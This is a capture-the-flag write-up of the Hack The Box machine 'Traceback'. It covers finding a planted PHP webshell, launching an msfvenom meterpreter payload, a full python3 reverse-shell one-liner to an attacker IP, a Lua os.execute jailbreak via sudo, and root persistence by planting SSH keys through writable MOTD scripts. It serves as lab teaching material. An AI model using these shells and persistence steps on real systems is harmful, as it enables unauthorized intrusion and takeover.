---
title: "Traceback"
date: 2020-08-11
classes: wide
excerpt_separator: <!--more-->
categories:
  - writeups
tags:
  - htb.easy
  - ctf
  - webshells
  - scripting
---

## >> INTRO
Traceback was quite the fun box, beginning with a site that appears to have been comrpomised by a "Xh4H" and defaced as such. Enumeration is key on this machine, as the foothold is almost entirely made up of details that you notice rather than CVEs or logical exploits; from there, privilege escalation is conducted via an in-built Linux tool that previously, I didn't know had a privilege escalation vulnerability (thanks Xh4H for showing me via this privesc!). Let's begin!

>Creator: [Xh4H](https://app.hackthebox.eu/users/21439)  
Rating: 4.0 stars

<!--more-->

## >> INITIAL ACCESS
As with every box on HTB, I start by adding it to my `/etc/hosts/` config for ease-of-use (normally I wouldn't do this on a test for multiple reasons). Really, it's just convenience at this point, I promise - the only other benefit that could be there is if the box has virtual host routing, it will *maybe* point to a different site. To do this, add the following entry to your hosts file:
```
10.10.10.181  traceback.htb
``` 
Once we've done that, we'll kick off our usual nmap scan - `sudo nmap -sCV -O -oA tcp-full -p- traceback.htb`. Note that this is extremely loud, so it's not the scan if I were on an actual engagement, but for CTFs it'll do nicely. This outputs the following:
```
# Nmap 7.80 scan initiated Fri Mar 27 22:04:36 2020 as: nmap -sCV -O -oA tcp-full -p- traceback.htb
Nmap scan report for traceback.htb (10.10.10.181)
Host is up (0.050s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/27%OT=22%CT=1%CU=30280%PV=Y%DS=2%DC=I%G=Y%TM=5E7EB0E
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=2%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar 27 22:05:31 2020 -- 1 IP address (1 host up) scanned in 55.08 seconds
```
So out of that, there's only 2 ports - not a lot to go off of. Since SSH (port 22) probably won't yield anything interesting, start with HTTP (port 80). Browsing to the home page gives us a really intersting scene; it appears to be a website that has been compromised and defaced by Xh4H. Since it's been compromised, it's not a terrible assumption that the attacker has left a backdoor into the system for our use so let's try to find it. Inspecting the source code leaves us with the following comment:

![HTTP Source Comment](/assets/images/traceback/http_source_comment.png)

If the text of that comment is run through Google, it should lead to Xh4H's own GitHub page. Checking out the repositories leeads to one titled "Web-Shells" and a description that matches. Inside the repository there are quite a few files - no surprise there, as there are many possibilities for web shells in both form and function. By trying the different filenames in the format of `traceback.htb/<webshell>.php`, eventually the smevk.php backdoor is discovered:

![Smevk webshell discovery](/assets/images/traceback/smevk_webshell_found.png)

Fantastic! Going back to Xh4h's GitHub, the username and password are found in `smevk.php`:

![smevk.php webshell creds](/assets/images/traceback/smevk_webshell_credentials.png)

Logging in with the found credentials grants access to a web UI that sits on top of the webshell. It has a ton of helper functionality built-in; we can use the tools it ships with to migrate to a more stable command shell. There are plenty of ways to go about this, but since we're not worried about any kind of stealth or AV evasion I'll create a payload with msfvenom and then upload it to disk and execute. In order to accurately perform this, make sure to enumerate properly with the webshell - things like architecture, writeable directories, etc. will go a long way in guaranteeing success when creating payloads. To generate a payload, I ran `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443`. From there, upload it to the victim server - your choice how this is achieved - and make sure to `chmod` it so that it can be executed. Once we execute the payload, we should receive a meterpreter shell:

![Reverse shell connection](/assets/images/traceback/revshell_connect.png)

## >> GETTING PROMOTED - WEBADMIN TO SYSADMIN

Okay, we're on the server now with a shell. Starting by enumerating who we are and what we can do leads to the following information:
* We are the user "webadmin"
* In our home directory, there is a note.txt
* Our home directory is /home/webadmin

One of the first things I check every time I'm on a Linux host is running `sudo -l`. For those who are unfamiliar with Linux, this command lists out which commands the current user can run with elevated privileges. The output of that command is:
```
Matching Default entries for webadmin on traceback:
  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
  (sysadmin) NOPASSWD: /home/sysadmin/luvit
```
What does this mean? This tells us three things:
* We can run the command `/home/sysadmin/luvit`
* We can run the command as the user `sysadmin`
* We can run the command without needing a password

Here's the problem - we're currently doing this within a meterpreter shell, and trying to execute the program within it goes south rather quickly:

![Executing the luvit command in meterpreter](/assets/images/traceback/luvit_repl.png)

To fix this (the easy way), I chose to migrate to a regular ncat reverse shell and then upgrade to a full TTY from there. The easiest way to do this is with python3, which is present on the server. Start an `ncat` listener to catch it then execute the following:
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.27",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
This should give us a shell under the same privileges that we currently have. However, it *doesn't* give us a full TTY. Let's fix that. [This ropnop blog post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) shows how to upgrade - my version is below.

![Upgrading to a full TTY](/assets/images/traceback/tty_upgraded.png)

Now that we're upgraded, the fun begins. Re-visiting our discovery from `sudo -l`, we execute `sudo -u sysadmin /home/sysadmin/luvit` - this drops us into a Luvit instance running on the box *as sysadmin*. That's fantastic, but how do we use this to our advantage? Let's check out the text file we found in the home directory:

>--sysadmin--  
I have left a tool to practice Lua.  
I'm sure you know where to find it.  
Contact me if you have any question.

It seems that this is a note from sysadmin to us, letting us know that they've enabled a tool to practice Lua. Coupled with some Googling, we confirm that Luvit is able to run Lua code snippets just like the native Python interpreter allows us to. Let's break out of this jail and get a shell as `sysadmin`!

As with python, Lua allows for native execution - Google shows us that the command to do so is `os.execute()`. To make life easy, I just crammed [pentestmonkey's reverse python shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) into `os.execute()` with my HTB IP address and port changed within it. This nets us a shell as `sysadmin`; to persist (and have a more stable shell!), I added a newly-generated SSH key to `/home/sysadmin/.ssh/authorized_keys` and then SSH'd into the box.

## >> BECOMING THE (SERVER) BOSS - SYSADMIN TO ROOT

To recap what we've accomplished thus far, we've:

* Found a web shell on the server
* Used the web shell to execute a reverse shell
* Used the reverse shell to get a full TTY
* Used access the `webadmin` user had to Luvit to create a reverse shell as `sysadmin`

As the sysadmin user, we don't appear to have access to much in our home directory - just user.txt and some standard files on Linux. Running our normal enumeration scripts (hello LinPEAS and Linenum!) nets us a ton of information, but one thing in particular stands out. Looking through the output of `ps aux` we see this *really, really odd cp* line...

![Odd cp command being run](/assets/images/traceback/cp_motd.png)

This is cause for some investigation. Checking `/var/backups` doesn't lead to anything other than permission errors, but if we check the other side we find this set of files that are *ALL* writeable by `sysadmin`:

![List of writeable files](/assets/images/traceback/cp_motd_perms_destination.png)

If you don't know what `.update-motd.d` is, no worries - [this article](https://www.putorius.net/custom-motd-login-screen-linux.html) has you covered for the basics. The TL;DR of it is that anything placed in `.update-motd.d` is added in to the message-of-the-day banner, including code that can be run. When it is executed, it does so with kernel privileges - this makes it a prime target for us to snag privilege escalation with. I decided to sneak an additional line into `00-header` that will add another SSH key into root's authorized_keys file so that I can SSH in as root. I start with replacing the `/etc/.update-motd.d/00-header` file with my new-and-evilly-improved version, then SSH in *a second time* as `sysadmin` to trigger the subverted MOTD banner. Once I've done this we can see a line that I've added `you know what this means` - and can be assured that the script ran:

![SSH key added successfully!](/assets/images/traceback/ssh_privesc_key_added.png)

Now all that's left to do is log in as root with our new root key by doing `ssh -i privesc root@traceback.htb`:

![SSH'ing as root never looked so good](/assets/images/traceback/ssh_as_root.png)

From here, do whatever you please - you're root after all!

## >> RECAP/LESSONS LEARNED

Well friends, we're at the end of our `traceback.htb` journey - hopefully you learned quite a bit! Today we covered the following:
* Web enumeration/OSINT (discovering the webshell repo)
* GitHub secrets (username/password in the GitHub)
* Using current access to our advantage (Luvit privesc)
* Turning MOTD against the sysadmins

Personally, I really enjoyed the box - thanks to Xh4H for creating it. Remember to respect++ the box creator if you enjoyed it!

\- sp1icer

## >> REFERENCES

Using nc for file transfers: [https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/](https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/)  
Lua os.execute(): [https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/](https://www.lua.org/pil/22.2.html)  